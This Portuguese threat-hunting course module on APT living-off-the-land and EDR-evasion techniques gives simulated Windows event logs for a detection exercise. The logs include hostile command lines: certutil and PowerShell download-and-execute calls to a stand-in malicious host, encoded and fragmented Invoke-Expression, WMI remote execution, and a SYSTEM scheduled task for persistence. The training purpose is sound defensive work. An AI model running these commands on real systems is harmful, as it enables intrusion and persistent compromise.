# Caça a Ameaças Persistentes (APTs)
- 01. Padrões de Ataque de APTs Living-off-the-Land (LotL)
- 02. Táticas de Evasão em EDRs
- 03. Uso do MITRE ATT&CK para Construção de Hipóteses
- 04. Identificação de artefatos maliciosos
- 05. Simulação de Ataque APT

## 01.5. Atividade Prática
Desafio: Analisar um conjunto de logs simulados (Sysmon, Security, PowerShell) e identificar:
- Uso de ferramentas LotL para execução de payloads.
- Tentativas de movimentação lateral via WMI e SMB.
- Artefatos que indicam persistência ou evasão.

Entrega esperada:
- Mapeamento das técnicas utilizadas com base no MITRE ATT&CK.
- Extração de IOCs e artefatos relevantes.
- Criação de hipóteses investigativas.
- Proposta de regras Sigma para detecção.

### Sysmon Logs (Event ID 1 – Process Creation)
Execução de PowerShell com comando obfuscado
```
<EventID>1</EventID>
<Image>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
<CommandLine>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBtAG...==</CommandLine>
<ParentImage>C:\Windows\explorer.exe</ParentImage>
<User>ADINT\Smith</User>
```
### Sysmon Logs (Event ID 1 – Process Creation)
Uso de CertUtil para download de payload
```
<EventID>1</EventID>
<Image>C:\Windows\System32\certutil.exe</Image> 
<CommandLine>certutil.exe -urlcache -split -f http://malicious[.]site/payload.bin C:\Users\Public\payload.bin</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage> 
<User>ADINT\Smith</User>
```
### Sysmon Logs (Event ID 1 – Process Creation)
Execução remota via WMI
```
<EventID>1</EventID>
<Image>C:\Windows\System32\wmic.exe</Image>
<CommandLine>wmic /node:"192.168.1.22" process call create "powershell -EncodedCommand SQBtAG..."</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage> 
<User>ADINT\Smith</User>
``` 
### Security Logs (Event ID 4624 – Logon Success)
Autenticação remota com conta privilegiada
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName> 
<LogonType>3</LogonType>
<WorkstationName>FINANCEIRO-PC</WorkstationName> 
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>NTLM</AuthenticationPackage>
``` 
### Security Logs (Event ID 4624 – Logon Success)
Autenticação remota com conta privilegiada
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName> 
<LogonType>3</LogonType>
<WorkstationName>FINANCEIRO-PC</WorkstationName> 
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>NTLM</AuthenticationPackage>
```
### Security Logs (Event ID 4624 – Logon Success)
Logon interativo suspeito em máquina lateral
```
<EventID>4624</EventID>
<SubjectUserName>admin</SubjectUserName>
<LogonType>10</LogonType>
<WorkstationName>RH-PC</WorkstationName>
<SourceNetworkAddress>192.168.1.10</SourceNetworkAddress>
<AuthenticationPackage>Kerberos</AuthenticationPackage>
```
### PowerShell Logs (Event ID 4104 – Script Block Logging)
Script obfuscado com função de download
```
EventID: 4104 
ScriptBlockText: 
$wc = New-Object System.Net.WebClient 
$payload =  $wc.DownloadString("http://malicious[.]site/payload.ps1") 
Invoke-Expression $payload
```
### PowerShell Logs (Event ID 4104 – Script Block Logging)
Criação de tarefa agendada para persistência
```
EventID: 4104 
ScriptBlockText: 
schtasks /create /tn "Updater" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1" /sc minute /mo 30 /ru SYSTEM
```

## 02. Táticas de evasão em EDRs
### 02.4. Exemplos de Logs
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Execução de PowerShell com comando obfuscado
```
<EventID>1</EventID>
<Image>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
<CommandLine>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBtAG...==</CommandLine>
<ParentImage>C:\Windows\explorer.exe</ParentImage>
<User>ADINT\Smith</User>
```
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Criação de processo legítimo para hollowing
```
<EventID>1</EventID>
<Image>C:\Windows\System32\notepad.exe</Image>
<CommandLine>notepad.exe</CommandLine>
<ParentImage>C:\Windows\System32\cmd.exe</ParentImage>
<User>ITAGUAI\thiago</User>
```
### 1. Sysmon Logs (Event ID 1 – Process Creation)
Execução de DLL maliciosa dentro do processo hollowed
```
<EventID>1</EventID>
<Image>C:\Windows\System32\notepad.exe</Image>
<CommandLine>notepad.exe (injected)</CommandLine>
<ParentImage>C:\Windows\System32\notepad.exe</ParentImage>
<User>ADINT\Smith</User>
```
### 2. Security Logs (Event ID 4688 – Process Creation Audit)
Execução de código via processo legítimo (indicando hollowing)
```
<EventID>4688</EventID>
<NewProcessName>C:\Windows\System32\notepad.exe</NewProcessName>
<ParentProcessName>C:\Windows\System32\cmd.exe</ParentProcessName>
<SubjectUserName>admin</SubjectUserName>
<CommandLine>notepad.exe</CommandLine>
```
### 3. PowerShell Logs (Event ID 4104 – Script Block Logging)
Comando obfuscado com base64 e função de execução
```
EventID: 4104
ScriptBlockText:
$cmd = 'SQBtAG...=='
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)) 
Invoke-Expression $decoded
```
### 3. PowerShell Logs (Event ID 4104 – Script Block Logging)
Fragmentação de comando malicioso
```
EventID: 4104 
ScriptBlockText: 
$a = 'Invoke-'; $b = 'WebRequest'; $c = '("http://malicious[.]site/payload.ps1")'; 
Invoke-Expression ($a + $b + $c)
```













